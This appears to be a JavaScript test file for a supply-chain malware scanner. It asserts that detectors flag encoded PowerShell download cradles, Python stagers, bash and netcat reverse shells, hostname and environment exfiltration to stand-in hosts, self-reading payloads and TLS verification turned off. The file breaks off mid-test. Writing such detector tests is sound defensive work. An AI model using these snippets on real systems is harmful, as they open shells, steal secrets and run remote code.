// Audit P0s (0.1.7): PowerShell that hides or fetches what it runs, stager
// strings, reverse shells, host information sent out, the grading of
// import-time reasons and aliased decoders. Twin of
// python/tests/scanner/test_supply_chain_signals.py; on a random corpus the
// engine is held to its recorded outputs by tests/architecture/test_snapshot_hooks.py
// (the npm package runs the native engine).
// Everything is inert text: hosts are .invalid, nothing is executed.

import { test } from "node:test";
import assert from "node:assert/strict";
import { Buffer } from "node:buffer";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { installScriptRisk, importTimeRisk, importTimeSeverity, installScriptSeverity, scanFile, run } from "../src/index.js";
import { powershellRisk, stagerAt, reverseShellAt, readsOwnSource, runsOwnSourceAt, importCode, call, scriptLang }
  from "../src/lib/native.js";
import { scInstallHookIssue } from "../src/lib/supplychain.js";

const PS_RUN = Buffer.from('Invoke-WebRequest -Uri "https://x.invalid/a.exe" -OutFile "a.exe"; '
  + 'Invoke-Expression "a.exe"', "utf16le").toString("base64");
const PS_ECHO = Buffer.from("echo hi", "utf16le").toString("base64");

test("PowerShell: encoded commands, cradles, a download started", () => {
  for (const text of [`subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand ${PS_RUN}', shell=False)`,
    `subprocess.run(['powershell.exe', '-enc', '${PS_RUN}'])`, `execSync('pwsh -e ${PS_RUN}')`]) {
    assert.deepEqual(powershellRisk(text), ["runs an encoded PowerShell command that downloads and runs code"], text);
  }
  assert.deepEqual(powershellRisk(`os.system('powershell -enc ${PS_ECHO}')`), ["runs an encoded PowerShell command"]);
  assert.deepEqual(powershellRisk("execSync('powershell -c \"irm https://x.invalid/i.ps1 | iex\"')"),
    ["runs PowerShell that downloads and runs code"]);
  for (const text of ["subprocess.run(['powershell', '-Command', 'Get-ChildItem Env:'])",
    "powershell -ExecutionPolicy Bypass -File build.ps1", "powershell -enc QUJD", "iwr https://x.invalid/a | iex"]) {
    assert.deepEqual(powershellRisk(text), [], text);
  }
});

test("stagers, reverse shells, host information", () => {
  const stager = '_t.write(b"""from urllib.request import urlopen as _u;exec(_u(\'https://x.invalid/p\').read())""")\n'
    + '_system(f"start {exe} {_t.name}")\n';
  assert.equal(stagerAt(stager), stager.indexOf('"""'));
  assert.ok(installScriptRisk(stager).includes("carries a script that downloads and runs code"));
  assert.equal(stagerAt("DOC = 'Call exec() on trusted code only; see https://docs.invalid'\n"), -1);
  for (const text of ["s = socket.socket()\ns.connect((h, 4444))\nos.dup2(s.fileno(), 0)\nsubprocess.call(['/bin/sh', '-i'])\n",
    "os.system('bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')\n", "os.system('nc -e /bin/sh 10.0.0.1 4242')\n",
    "const net = require('net'), sh = require('child_process').spawn('/bin/sh', []);\n"
    + "const c = new net.Socket();\nc.connect(4444, h, () => { c.pipe(sh.stdin); sh.stdout.pipe(c); });\n"]) {
    assert.ok(reverseShellAt(text) >= 0, text);
  }
  assert.equal(reverseShellAt("fd = os.open(log, os.O_WRONLY)\nos.dup2(fd, 1)\n"), -1);
  // 0.1.8: the host name's flow into a request (0.1.7 read it anywhere in a file that used the network)
  const HOST = "sends the machine's user or host name over the network";
  for (const text of ["import socket, urllib.request\nurllib.request.urlopen('https://x.invalid/?h=' + socket.gethostname())\n",
    "const os = require('os');\nfetch('https://x.invalid/', {method: 'POST', body: os.hostname()});\n"]) {
    assert.ok(installScriptRisk(text).includes(HOST), text);
  }
  for (const text of ["import socket\nprint(socket.gethostname())\n", "print('run whoami to check')\nrequests.get(u)\n",
    "import socket, requests\nh = socket.gethostname()\nlog(h)\nrequests.get('https://x.invalid/v')\n"]) {
    assert.ok(!installScriptRisk(text).includes(HOST), text);
  }
});

test("import-time grading", () => {
  const beacon = "import socket, requests\n\ndef send():\n"
    + "    requests.post('https://webhook.site/0000', json={'h': socket.gethostname()})\n";
  const [reasons, line] = importTimeRisk(beacon);
  assert.deepEqual([reasons, line, importTimeSeverity(reasons)],
    [["sends the machine's user or host name to a data-capture service (webhook.site)"], 4, "CRITICAL"]);
  const telemetry = "import socket, requests\nrequests.post('https://telemetry.invalid/v1', json={'host': socket.gethostname()})\n";
  assert.deepEqual(importTimeRisk(telemetry)[0], []);
  // 2.17: what no library sends when it is loaded, sent anywhere; a client's own key, to its service, is not a finding
  const harvest = "import os, json, requests\nrequests.post('https://api.invalid/c', data=json.dumps(dict(os.environ)))\n";
  assert.equal(importTimeSeverity(importTimeRisk(harvest)[0]), "CRITICAL");
  const one = "import os, requests\nrequests.post('https://api.invalid/c', headers={'key': os.environ['EXAMPLE_KEY']})\n";
  assert.deepEqual(importTimeRisk(one)[0], []);
  const binary = "const https = require('https');\nhttps.get(u, (r) => r.pipe(fs.createWriteStream(dst)));\n"
    + "execFileSync(dst, ['--version']);\n";
  assert.equal(importTimeSeverity(importTimeRisk(binary)[0]), "MAJOR");
  const pyRun = "import requests, subprocess\nd = requests.get('https://x.invalid/p').content\n"
    + "open('p.py', 'wb').write(d)\nsubprocess.run(['python3', 'p.py'])\n";
  assert.equal(importTimeSeverity(importTimeRisk(pyRun)[0]), "CRITICAL");
});

test("import time: prose is read out, PowerShell must be handed to an exec call", () => {
  const selfUpdate = "import subprocess\n\ndef run_update():\n    return subprocess.call(_cmd())\n\n\ndef _cmd():\n"
    + "    # `iwr ... | iex` cannot take parameters: create a scriptblock\n"
    + "    return [\"powershell\", \"-NoProfile\", \"-Command\", \"& ([scriptblock]::Create((iwr -useb "
    + "https://x.invalid/i.ps1)))\"]\n";
  assert.deepEqual(importTimeRisk(selfUpdate, "py"), [[], null]);
  const doc = 'import subprocess\n\ndef installed():\n    """True when installed with\n'
    + '        powershell -ExecutionPolicy ByPass -c "irm https://x.invalid/i.ps1 | iex"\n    """\n'
    + '    return subprocess.run(["powershell", "-Command", "Get-ChildItem Env:"])\n';
  assert.deepEqual(importTimeRisk(doc), [["runs PowerShell that downloads and runs code"], 7]);
  assert.deepEqual(importTimeRisk(doc, "py"), [[], null]);
  const keys = 'import socket\n\nclass Client:\n    def load(self):\n'
    + '        """Loads ``id_rsa`` and ``id_rsa-cert.pub``."""\n        return socket.socket()\n';
  assert.deepEqual(importTimeRisk(keys, "py"), [[], null]);
  assert.deepEqual(importTimeRisk("const https = require('https');\n// JSON.stringify(process.env) is never sent\nhttps.get(u);\n", "js"),
    [[], null]);
  const run = "import subprocess\nsubprocess.run(\n    [\n        \"powershell\",\n        \"-c\",\n"
    + "        \"irm https://x.invalid/i.ps1 | iex\",\n    ]\n)\n";
  assert.deepEqual(importTimeRisk(run, "py"), [["runs PowerShell that downloads and runs code"], 4]);
  // (code in a string is a stager's: read on the tree, Python's received
  // code is the code's, not a string's, as JavaScript's)
  const runDoc = '"""\nimport urllib.request\nexec(urllib.request.urlopen("https://x.invalid/p").read())\n"""\nexec(__doc__)\n';
  assert.deepEqual(importTimeRisk(runDoc, "py")[0], ["carries a script that downloads and runs code",
    "runs code it reads back from its own file or a data file shipped with it"]);
  const beacon = 'requests.post("https://webhook.site/0", data=socket.gethostname())';
  // an argument, a continued line, joined to the string before it, an f-string, something after it: code
  // (a string's text is no flow, 0.1.8)
  for (const text of [`x = (\n    """${beacon}"""\n)\n`, `x = \\\n"""${beacon}"""\n`, `x = f(\n    'a'\n    """${beacon}"""\n)\n`,
    `f"""${beacon}"""\n`, `"""${beacon}""".strip()\n`]) {
    assert.equal(importCode(text, "py"), text, text);
  }
  const standalone = `x = 1\n"""\n${beacon}\n"""\n`;
  assert.notEqual(importCode(standalone, "py"), standalone);
  assert.deepEqual(importTimeRisk(standalone, "py"), [[], null]);
});

test("code read back from the file itself", () => {
  const OWN = "runs code it reads back from its own file or a data file shipped with it";
  const c2 = "# C2: https://webhook.site/abc\nimport socket, requests, re\n"
    + "url = re.search(r'# C2: (\\S+)', open(__file__).read()).group(1)\n"
    + "requests.post(url, data=socket.gethostname())\n";
  assert.ok(readsOwnSource(c2));
  assert.deepEqual(importTimeRisk(c2, "py"), importTimeRisk(c2));
  assert.equal(importTimeSeverity(importTimeRisk(c2, "py")[0]), "CRITICAL");
  for (const [lang, text, line] of [
    ["py", '"""\nimport os; os.system("id")\n"""\nexec(open(__file__).read().split(\'"""\')[1])\n', 4],
    ["py", 'src = open(__file__).read()\ncode = src.split("#!")[1]\nexec(code)\n#!print(1)\n', 3],
    ["py", '"""print(1)"""\nexec(__doc__)\n', 2],
    ["js", "const fs = require('fs');\neval(fs.readFileSync(__filename, 'utf8').split('/*')[1].split('*/')[0]);\n"
      + "/* require('child_process').execSync('id') */\n", 2],
    ["js", "const p = (function(){/*require('child_process').execSync('id')*/}).toString();\n"
      + "new Function(p.slice(p.indexOf('/*') + 2, p.lastIndexOf('*/')))();\n", 2]]) {
    assert.deepEqual(importTimeRisk(text, lang), [[OWN], line], text);
    assert.ok(installScriptRisk(text).includes(OWN), text);
  }
  assert.ok(runsOwnSourceAt('import os\nexec(open(os.path.join(os.path.dirname(__file__), "logo.png")).read())\n') >= 0);
  for (const text of ["import os\nhere = os.path.dirname(__file__)\nexec(open(os.path.join(here, 'pkg', 'version.py')).read())\n",
    '"""Tool."""\nimport argparse\np = argparse.ArgumentParser(description=__doc__)\n',
    'SHIM = """exec(compile(open(__file__).read(), __file__, "exec"))"""\nsubprocess.run([py, "-c", SHIM])\n',
    "NAMES = ('__doc__', '__name__')\nsrc = 'def f(): pass'\nexec(src)\n"]) {
    assert.equal(runsOwnSourceAt(text), -1, text);
  }
});

test("a licence read asynchronously by its path's name (0.1.8)", () => {
  const OWN = "runs code it reads back from its own file or a data file shipped with it";
  const thunk = "const fs = require('fs');\nconst path = require('path');\nconst parseLib = require('./parse')\n\n"
    + "const filePath = path.join(__dirname, 'LICENSE');\n\nfs.readFile(filePath, 'utf8', (_, data) => {\n  try {\n"
    + "    // Only eval if you're sure it's valid JS\n    eval(parseLib(data))\n  } catch (err) {\n"
    + "    console.error('Error during parsing/eval:', err);\n  }\n});\n";
  assert.deepEqual(installScriptRisk(thunk), [OWN]);
  assert.deepEqual(importTimeRisk(thunk, "js"), [[OWN], 10]);
  for (const text of ["fs.readFile(path.join(__dirname, 'payload.dat'), (err, buf) => { eval(decrypt(buf)); });",
    "const p = path.join(__dirname, 'data.bin');\nfs.promises.readFile(p).then((b) => eval(b.toString()));",
    "const p = `${__dirname}/README`;\nconst src = await fsp.readFile(p, 'utf8');\nvm.runInThisContext(xor(src));",
    "import os\np = os.path.join(os.path.dirname(__file__), 'LICENSE')\nwith open(p) as f:\n    exec(f.read())\n",
    "p = Path(__file__).parent / 'NOTICE'\nexec(base64.b64decode(p.read_text()))\n",
    "require('fs').readFile(__filename, 'utf8', (e, s) => eval(s.split('//@')[1]));"]) {
    assert.ok(runsOwnSourceAt(text) >= 0, text);
  }
  // a path read by name gives a value that counts only in a code runner
  const pkg = "const pkgPath = path.join(__dirname, 'package.json');\n"
    + "const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));\nexecSync('git tag v' + pkg.version);\n";
  assert.equal(runsOwnSourceAt(pkg), -1);
  assert.ok(runsOwnSourceAt(pkg.replace("execSync(", "eval(")) >= 0);
  for (const text of ["const p = path.join(__dirname, 'LICENSE');\nfs.readFile(p, 'utf8', (e, t) => console.log(t));\n",
    "const tpl = \"fs.readFile(path.join(__dirname, 'LICENSE'), (e, d) => eval(d))\";\n",
    "fs.readFile(userFile, (e, d) => eval(d));", "const p = path.join(__dirname, 'lib.js');\nfs.readFile(p, (e, d) => eval(d));"]) {
    assert.equal(runsOwnSourceAt(text), -1, text);
  }
  for (const text of ["p = __dirname + '" + "a/".repeat(100_000) + "\n" + "fs.readFile(p, (e, d) => eval(d));\n".repeat(2_000),
    "fs.readFile(p, ".repeat(100_000), "`${__dirname}/".repeat(100_000), ("__dirname" + "}/".repeat(100)).repeat(7000)]) {
    const start = performance.now();
    runsOwnSourceAt(text);
    assert.ok(performance.now() - start < 10_000, text.slice(0, 30));
  }
});

test("aliased decoders and decrypted payloads in the decode flow", () => {
  const found = (content) => scanFile({ name: "site-packages/x/a.py", content, lang: "py", dep: true })
    .filter((i) => i.rule === "SC-EVAL-DECODE").map((i) => i.line);
  assert.deepEqual(found("from base64 import b64encode, b64decode as invoke\nexec(invoke('aW1wb3J0IG9z'))\n"), [2]);
  assert.deepEqual(found("from zlib import decompress as z\nblob = z(data)\nexec(blob)\n"), [3]);
  assert.deepEqual(found("from cryptography.fernet import Fernet\nexec(Fernet(b'k').decrypt(b'gAAAA'))\n"), [2]);
  assert.deepEqual(found("from base64 import b64encode as enc\nexec(enc(b'x'))\n"), []);
});

test("what a script puts into a container, the container holds (D-3)", () => {
  // the tree model knew an array's push and unshift on a name alone (python: ContainerTests)
  const send = (body) => `fetch('https://x.invalid/c', {method: 'POST', body: ${body}});\n`;
  for (const [fill, body] of [
    ["const c = new FormData();\nc.append('e', JSON.stringify(process.env));\n", "c"],
    ["const c = new Map();\nc.set('e', process.env);\n", "JSON.stringify(Object.fromEntries(c))"],
    ["const c = new Set();\nc.add(JSON.stringify(process.env));\n", "JSON.stringify([...c])"],
    ["const c = {};\nObject.assign(c, { e: process.env });\n", "JSON.stringify(c)"],
  ]) {
    assert.deepEqual(installScriptRisk(fill + send(body), true, false, "js"),
      ["sends environment variables over the network (the whole environment)"], fill);
  }
  assert.deepEqual(installScriptRisk("const c = new Map();\nc.set('e', process.env);\n" + send("'ok'"), true, false, "js"), []);
});

test("a method reads this as the instance it is called on, in a class made in several places (B-3)", () => {
  // python: InstanceTests
  const cls = "class R {\n  setCode(t) { this.c = t; }\n  go() { this.run(); }\n  run() { eval(this.c); }\n}\n" +
    "const a = new R();\nconst b = new R();\n";
  const get = (call) => "const https = require('https');\nhttps.get('https://x.invalid/c', (res) => {\n  let d = '';\n" +
    `  res.on('data', (c) => { d += c; });\n  res.on('end', () => { a.setCode(d); ${call}; });\n});\n`;
  for (const call of ["a.run()", "a.go()"]) {
    assert.ok(importTimeRisk(cls + get(call), "js")[0].includes("runs code it receives over the network"), call);
  }
  assert.ok(!importTimeRisk(cls + get("b.run()"), "js")[0].includes("runs code it receives over the network"));
});

test("a member's container holds what it is given, apart from the object (D-3b)", () => {
  // python: MemberContainerTests
  const send = (body) => `fetch('https://x.invalid/c', {method: 'POST', body: ${body}});\n`;
  const cls = (keep, body) => "class C {\n  constructor() { this.items = []; this.name = 'x'; }\n  keep() { " + keep
    + " }\n  send() { " + send(body) + " }\n}\nconst c = new C();\nc.keep();\nc.send();\n";
  for (const text of [
    "const o = { list: [] };\no.list.push(process.env);\n" + send("JSON.stringify(o.list)"),
    "const o = { opts: {} };\nObject.assign(o.opts, { e: process.env });\n" + send("JSON.stringify(o.opts)"),
    cls("this.items.push(process.env);", "JSON.stringify(this.items)"),
  ]) {
    assert.deepEqual(installScriptRisk(text, true, false, "js"),
      ["sends environment variables over the network (the whole environment)"], text);
  }
  for (const text of ["const o = { list: [], name: 'x' };\no.list.push(process.env);\n" + send("o.name"),
    cls("this.items.push(process.env);", "this.name")]) {
    assert.deepEqual(installScriptRisk(text, true, false, "js"), [], text);
  }
});

test("a download a callback is given, written to a file and run (D-2)", () => {
  // the request client's body, https.get's chunks, a pipe into a file (python: test_droppers.CallbackTests)
  const head = "const fs = require('fs');\nconst { exec } = require('child_process');\nconst p = '/tmp/x.py';\n";
  for (const shape of [
    "const request = require('request');\nrequest.get('https://h.invalid/x.py', (e, r, b) => { fs.writeFileSync(p, b); exec('python3 ' + p); });\n",
    "const https = require('https');\nhttps.get('https://h.invalid/x.py', (res) => { let d = ''; res.on('data', (c) => { d += c; }); res.on('end', () => { fs.writeFileSync(p, d); exec('python3 ' + p); }); });\n",
    "const https = require('https');\nhttps.get('https://h.invalid/x.py', (res) => { const f = fs.createWriteStream(p); res.pipe(f); f.on('finish', () => exec('python3 ' + p)); });\n",
  ]) {
    assert.deepEqual(installScriptRisk(head + shape, true, false, "js"), ["downloads a script and runs it with Python"], shape);
    assert.deepEqual(importTimeRisk(head + shape, "js")[0], ["downloads a script and runs it with Python"], shape);
  }
  // a download kept, nothing run: no reason of the tree's (the text detector's is as before)
  const kept = importTimeRisk(head + "require('https').get('https://h.invalid/x.py', (res) => { res.pipe(fs.createWriteStream(p)); });\n", "js")[0];
  assert.ok(!kept.some((r) => r.includes("runs it with")), kept.join("; "));
});

test("code written into another package's folder (D-9)", () => {
  // @dinzid04/libsignal-node 2.2.5's shape (python: test_rewrites.py)
  const text = "const fs = require('fs');\nconst path = require('path');\n" +
    "const base = require.resolve('@whiskeysockets/baileys/package.json').replace('/package.json', '');\n" +
    "fs.writeFileSync(path.join(base, 'lib', 'Socket', 'newsletter.js'), 'exports.x = 1;');\n";
  assert.deepEqual(importTimeRisk(text, "js")[0], ["rewrites another package's code (@whiskeysockets/baileys)"]);
  assert.deepEqual(installScriptRisk(text, true, false, "js"), ["rewrites another package's code (@whiskeysockets/baileys)"]);
  // a data file there is not code
  assert.deepEqual(importTimeRisk(text.replace("newsletter.js", "data.json"), "js")[0], []);
});

test("the environment held or copied, read by a member's name (D-16); a JSON file given require (D-18)", () => {
  // prisma 8.0.0-rc.21's shape and corepack 0.36.0's (python: test_env_copies.py)
  const send = (v) => `fetch('https://collect.invalid/c', { method: 'POST', body: ${v} });\n`;
  const prisma = "function base(env = process.env) { return env.API_URL || 'https://api.invalid'; }\n" + send("base()");
  assert.deepEqual(importTimeRisk(prisma, "js")[0], []);
  assert.deepEqual(importTimeRisk("const env = { ...process.env };\n" + send("JSON.stringify(env)"), "js")[0],
    ["reads credentials or the whole environment and sends data over the network"]);
  const dl = (end) => "const https = require('https');\nhttps.get('https://dl.invalid/m', (res) => { let d = ''; " +
    `res.on('data', (c) => d += c); res.on('end', () => { ${end} }); });\n`;
  assert.deepEqual(importTimeRisk(dl("require(require('path').join('/tmp', d, 'package.json'));"), "js")[0], []);
  assert.deepEqual(importTimeRisk(dl("require(d);"), "js")[0], ["loads a module named by data it receives over the network"]);
});

test("linear time on hostile texts", () => {
  for (const text of ["powershell ".repeat(50_000), "powershell -e " + "A".repeat(400_000), "'".repeat(200_000) + "exec http",
    "dup2(".repeat(100_000), "$(whoami)".repeat(50_000), "iwr ".repeat(100_000) + "| iex"]) {
    const t0 = Date.now();
    installScriptRisk(text);
    importTimeRisk(text);
    assert.ok(Date.now() - t0 < 10_000, text.slice(0, 20));
  }
  const beacon = "import requests, socket\nrequests.post('https://webhook.site/0', data=socket.gethostname())\n";
  for (const tail of [" ".repeat(200_000) + "'a' ".repeat(50_000), "x = 1; " + "'a'; ".repeat(60_000), "#\n".repeat(100_000),
    '"""\n'.repeat(50_000), "(".repeat(100_000) + "'a'\n".repeat(20_000), "\\\n'a'\n".repeat(40_000),
    "powershell ".repeat(50_000) + "os.system(".repeat(1000)]) {
    for (const lang of ["py", "js"]) {
      const t0 = Date.now();
      assert.ok(importTimeRisk(beacon + tail, lang)[0].length);
      assert.ok(Date.now() - t0 < 10_000, `${tail.slice(0, 20)} ${lang}`);
    }
  }
});

const CERT_OFF = "turns off TLS certificate verification";
const WSH = "runs a script with the Windows Script Host";
const launches = (reasons) => reasons.some((r) => r.startsWith(WSH));

test("RA-12: TLS certificate verification turned off, every language and form", () => {
  for (const text of [
    "requests.get('https://x.invalid/a', verify=False)\n",
    "import ssl\nctx = ssl._create_unverified_context()\n",
    "ctx.verify_mode = ssl.CERT_NONE\n",
    "const a = new https.Agent({ rejectUnauthorized: false });\n",
    "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';\n",
    'process.env["NODE_TLS_REJECT_UNAUTHORIZED"]="0"\n',
    "opts.rejectUnauthorized = false\n",
    '{ "rejectUnauthorized": false }\n',
    "c := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}\n",
    "reqwest::blocking::Client::builder().danger_accept_invalid_certs(true);\n",
    "git -c http.sslVerify=false clone https://x.invalid/r\n",
    "git config http.sslVerify false\n",
    "npm config set strict-ssl false\n",
    "wget --no-check-certificate https://x.invalid/a\n",
    "curl -sSLk https://x.invalid/a\n",
    "subprocess.run(['curl', '-k', 'https://x.invalid'])\n",
  ]) {
    assert.ok(installScriptRisk(text).includes(CERT_OFF), text);
  }
});

test("RA-12: cert-off false positives are clean (code only, case-sensitive, curl gap bounded)", () => {
  for (const [text, lang] of [
    ["let verify = false;\n", "js"],
    ["requests.get(u, skip_tls_verify=False)\n", "py"],
    ["// Do not set rejectUnauthorized: false here\n", "js"],
    ["curl -LO u && xz -dk a.xz\n", null],
    ["sort -k 2 file\n", null],
    ["make -k\n", null],
    ["curl -K cfg https://x.invalid\n", null],
    ["requests.get('https://x.invalid', verify=True)\n", null],
    ["curl -o pkg.tgz https://x.invalid/a\n", null],
  ]) {
    assert.ok(!installScriptRisk(text, true, false, lang).includes(CERT_OFF), text);
  }
});

test("RA-12: cert-off is dropped from the import-time test, and is a weaker install reason", () => {
  const [reasons] = importTimeRisk("import requests\nrequests.get('https://x.invalid', verify=False)\n");
  assert.ok(!reasons.includes(CERT_OFF));                                  // not an indicator at import time
  assert.equal(installScriptSeverity([CERT_OFF]), "MAJOR");                // a weaker install reason
  assert.equal(installScriptSeverity([CERT_OFF, "opens a reverse shell"]), "CRITICAL");
});

test("RA-11: the Windows Script Host launcher, and its false positives", () => {
  for (const text of ["subprocess.run(['wscript', 'C:\\\\x\\\\launcher.vbs'])\n", "os.system('cscript //nologo run.js')\n",
    "os.system('CScript //B install.vbs')\n", "subprocess.run(['WScript.exe', 'run.js'])\n",
    "cmd = 'wsc' + 'ript launcher.v' + 'bs'\nos.system(cmd)\n"]) {
    assert.ok(launches(installScriptRisk(text, true, false, "py")), text);
  }
  for (const [text, lang] of [
    ["subprocess.run(['node', 'run.js'])\n", "py"],
    ["// run: cscript //nologo install.js\n", "js"],
    ["spawn('node', ['scripts/check-wscript.js'])\n", "js"],
    ["LOLBINS = ['mshta.exe', 'wscript.exe']\nEXTS = ['.vbs', '.js']\n", "py"],
    ["log('Blocked mshta from running payload.hta')\n", "py"],
  ]) {
    assert.ok(!launches(installScriptRisk(text, true, false, lang)), text);
  }
});

// ---- the review of RA-12 / RA-11 (0298bd6): a weak reason never hides a strong one; WSH launches matched where
// they run; comments blanked in the script's own language. Twin of WeakReasonAndLaunchTests and
// WeakReasonFollowTests (python/tests/scanner/test_supply_chain_signals.py). Inert: hosts are example.com or
// 192.0.2.x, nothing runs.

const DL = "downloads.example.com";
const WEAK_JS = `require('https').get({ host: '${DL}', rejectUnauthorized: false });\n`;
const WSH_JS = "require('child_process').spawn('wscript', ['x.js']);\n";
const SENDS_ENV = "const https = require('https');\n"
  + "https.request({ host: 'collect.example.com', method: 'POST' }).end(JSON.stringify(process.env));\n";
/** The launch the WSH reason shows (what is in its parentheses), or null. */
const shownLaunch = (reasons) => {
  const r = reasons.find((x) => x.startsWith(`${WSH} (`));
  return r ? r.slice(WSH.length + 2, -1) : null;
};
/** [[sev, msg]] of a need-protocol call (autorun_issues, agentdoc_issues), the files it asks for from `files`. */
function needLoop(name, path, body, files, extra = {}) {
  const have = {};
  for (let k = 0; k < 6; k++) {
    const got = call(name, { path, files: have, ...extra }, body);
    if (got.issues) return got.issues.map((r) => [r[1].sev, r[1].msg]);
    for (const rel of got.need) have[rel] = rel in files ? files[rel] : null;
  }
  throw new Error("the call kept asking");
}
const autorun = (command, files) => needLoop("autorun_issues", ".vscode/tasks.json",
  JSON.stringify({ version: "2.0.0", tasks: [{ label: "x", type: "shell", command, runOptions: { runOn: "folderOpen" } }] }),
  files);
// a dependency's AGENTS.md (the project's own are INFO, RA-3)
const agentdoc = (body, files) => needLoop("agentdoc_issues", "AGENTS.md", body, files, { dep: true });

test("review: WSH launches in code, string and argv form, shown alone", () => {
  for (const [text, lang, shown] of [
    ["const cp = require('child_process');\ncp.exec('cscript ' + path.join(__dirname, 'x.vbs'));\n", "js",
      "cscript + path.join(__dirname, 'x.vbs')"],
    ["const cp = require('child_process');\ncp.execSync(`cscript ${__dirname}/run.vbs`);\n", "js", "cscript ${__dirname}/run.vbs"],
    ["require('child_process').execSync(`cscript //nologo ${f}`);\n", "js", "cscript //nologo ${f}"],
    ["require('child_process').execFile('cscript.exe', ['//nologo', 'x.vbs']);\n", "js", "cscript.exe //nologo x.vbs"],
    ["cp.spawn(\n  'cscript',\n  ['//nologo', 'x.vbs']\n);\n", "js", "cscript //nologo x.vbs"],
    ["import os\nos.system('cscript ' + os.path.join(d, 'x.vbs'))\n", "py", "cscript + os.path.join(d, 'x.vbs')"],
    ["import subprocess\nsubprocess.run(['wscript', p])\n", "py", "wscript p"],
    ["import subprocess\nsubprocess.Popen(['cscript.exe', '//nologo', script])\n", "py", "cscript.exe //nologo script"],
    ["CMD = '''cscript //nologo x.vbs'''\nos.system(CMD)\n", "py", "cscript //nologo x.vbs"],
  ]) {
    assert.equal(shownLaunch(installScriptRisk(text, true, false, lang)), shown, text);
  }
  for (const [cmd, shown] of [["cmd /c cscript //nologo x.vbs", "cscript //nologo x.vbs"],
    ["start \"\" wscript x.js", "wscript x.js"], ["wscript //B //E:jscript payload.txt", "wscript //B //E:jscript payload.txt"],
    ["C:\\Windows\\System32\\cscript.exe //nologo C:\\t\\run.js", "C:\\Windows\\System32\\cscript.exe //nologo C:\\t\\run.js"]]) {
    assert.equal(shownLaunch(installScriptRisk(cmd, false, true)), shown, cmd);
  }
  const text = "require('child_process').spawn('wscript', ['x.js']);\nconst later = 'nothing to do with the launch';\n";
  assert.ok(installScriptRisk(text, true, false, "js").includes(`${WSH} (wscript x.js)`));
});

test("review: prose, comments, LOLBin lists and file names are not launches", () => {
  for (const [text, lang] of [
    ["console.log('On Windows, run cscript setup.vbs to finish');\n", "js"],
    ["print('Run wscript helper.js by hand if this fails')\n", "py"],
    ["HELP = 'Usage: cscript tool.vbs [args]'\n", "py"],
    ["// we never run cscript x.vbs here\nmodule.exports = 1;\n", "js"],
    ["# run cscript x.vbs on windows\nx = 1\n", "py"],
    ["const LOLBINS = ['mshta.exe', 'wscript.exe', 'cscript.exe'];\nmodule.exports = LOLBINS;\n", "js"],
    ["const exts = {wscript: '.vbs', cscript: '.js'};\n", "js"],
    ["require('child_process').spawn('node', ['scripts/check-wscript.js']);\n", "js"],
    ["Use `wscript x.js` to run it on Windows.\n", null],
  ]) {
    assert.equal(shownLaunch(installScriptRisk(text, true, false, lang)), null, text);
  }
  for (const cmd of ["echo please run cscript setup.vbs", "cscript\nx.vbs", "node scripts/check-wscript.js"]) {
    assert.equal(shownLaunch(installScriptRisk(cmd, false, true)), null, cmd);
  }
});

test("review: comments blanked in the script's own language (scriptLang)", () => {
  for (const [path, text, lang] of [["install", "#!/bin/sh\ncurl\n", null], ["bin/cli", "#!/usr/bin/env node\n", "js"],
    ["x.bash", "", null], ["install.cmd", "", "bat"], ["x.ps1", "", "other"], ["x.mjs", "", "js"], ["install", "", "js"]]) {
    assert.equal(scriptLang(path, text), lang, path);
  }
  for (const [path, text, want] of [
    ["install", `#!/bin/sh\ncurl -fsSL https://${DL}/x -k -o bin/x\n`, CERT_OFF],
    ["install.cmd", "@echo off\r\ncscript //nologo setup.vbs\r\n", WSH],
    ["install.cmd", "@echo off\r\nmshta http://192.0.2.10/x.hta\r\n", WSH],
    ["install.bat", `wget https://${DL}/x --no-check-certificate\r\n`, CERT_OFF],
  ]) {
    const got = installScriptRisk(text, true, false, scriptLang(path, text));
    assert.ok(got.some((r) => r.startsWith(want)), `${path}: ${got}`);
  }
  const rem = `@echo off\r\nREM curl -k https://${DL}/x\r\n:: wget --no-check-certificate\r\n`;
  assert.deepEqual(installScriptRisk(rem, true, false, scriptLang("install.cmd", rem)), []);
});

test("review: git's http.sslVerify key in any case; installScriptSeverity of no reasons", () => {
  for (const text of ["git -c http.sslverify=false clone https://192.0.2.10/r\n", "git config --global HTTP.SSLVERIFY false\n"]) {
    assert.ok(installScriptRisk(text).includes(CERT_OFF), text);
  }
  assert.ok(!installScriptRisk("https.get({ RejectUnauthorized: false });\n").includes(CERT_OFF));
  assert.equal(installScriptSeverity([]), null);
});

test("review: scInstallHookIssue's severity from its reasons", () => {
  const sev = (reasons) => scInstallHookIssue("package.json", 1, [""], "postinstall", "x", reasons).sev;
  assert.equal(sev([CERT_OFF]), "MAJOR");
  assert.equal(sev([CERT_OFF, `${WSH} (cscript x.vbs)`]), "CRITICAL");
  assert.equal(sev([]), "MAJOR");
  assert.ok(scInstallHookIssue("package.json", 1, [""], "postinstall", "x", [CERT_OFF]).msg.includes(CERT_OFF));
});

test("review: a weak reason hides no strong one (autorun, agent doc, .pth)", () => {
  const cert = `curl -k https://${DL}/x -o y`;
  const weak = autorun(cert, {});
  assert.deepEqual(weak.map(([s]) => s), ["MAJOR"]);
  assert.ok(weak[0][1].includes(CERT_OFF));
  let found = autorun(`${cert}; node evil.js`, { "evil.js": SENDS_ENV });
  assert.deepEqual(found.map(([s]) => s), ["CRITICAL"]);
  assert.ok(found[0][1].includes("runs evil.js"), found[0][1]);
  found = autorun("node a.js && node b.js", { "a.js": WEAK_JS, "b.js": WSH_JS });
  assert.deepEqual(found.map(([s]) => s), ["CRITICAL"]);
  assert.ok(found[0][1].includes(`runs b.js; that file ${WSH} (wscript x.js)`), found[0][1]);
  assert.deepEqual(agentdoc(`# Setup\n\nRun \`${cert}\`.\n`, {}).map(([s]) => s), ["MAJOR"]);
  found = agentdoc(`# Setup\n\nRun \`${cert} && sh ./setup.sh\`.\n`, { "setup.sh": "#!/bin/sh\ncscript //nologo x.vbs\n" });
  assert.deepEqual(found.map(([s]) => s), ["CRITICAL"]);
  const pth = (line) => call("pth_issues", {}, line).map((i) => [i[0], i[3]]);
